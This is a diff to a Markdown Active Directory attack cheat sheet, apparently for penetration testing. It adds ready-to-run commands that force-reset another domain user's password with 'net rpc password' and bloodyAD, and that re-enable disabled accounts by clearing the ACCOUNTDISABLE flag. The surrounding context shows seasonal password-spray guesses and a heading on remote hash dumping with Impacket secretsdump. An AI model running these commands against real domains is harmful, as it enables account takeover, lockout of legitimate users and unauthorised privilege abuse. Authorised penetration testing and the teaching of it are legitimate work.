@@ -28,7 +28,25 @@ for year in 2023 2024; do for s in Spring Summer Fall Winter; do echo "${s}${yea
 # Seasonal: Summer2024!, Winter2023@
 ```
 
-## 4.2 Hash Dumping
+## 4.2 Password Reset 
+
+```bash
+# Reset with net rpc 
+net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
+
+# Reset with BloodayAD
+bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password
+```
+
+## Enable a Disabled Account 
+
+```bash
+bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE
+# or use with --dc-ip
+bloodyAD --dc-ip $dc-ip -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE
+```
+
+## 4.3 Hash Dumping
 
 ### Secretsdump (Impacket) — Remote Hash Extraction
 
